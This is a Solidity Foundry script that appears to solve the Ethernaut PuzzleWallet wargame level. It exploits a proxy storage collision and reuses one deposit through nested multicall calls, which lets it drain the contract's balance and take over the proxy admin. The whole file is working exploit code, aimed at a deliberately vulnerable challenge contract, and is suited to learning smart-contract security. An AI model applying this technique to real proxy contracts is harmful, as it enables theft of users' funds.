// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../instances/Ilevel24.sol";

contract POC is Script {

    PuzzleWallet wallet = PuzzleWallet(0x7E069Cb68CE876D435b422652f86462F4A276145);
    PuzzleProxy px = PuzzleProxy(0x7E069Cb68CE876D435b422652f86462F4A276145);

    function run() external{
        vm.startBroadcast();

        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        // making ourselves owner of wallet
        px.proposeNewAdmin(msg.sender);
        //whitelisting our address
        wallet.addToWhitelist(msg.sender);
        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(msg.sender));
        //making sure our exploit worked
        console.log("New Admin is : ", px.admin());

        vm.stopBroadcast();
    }
}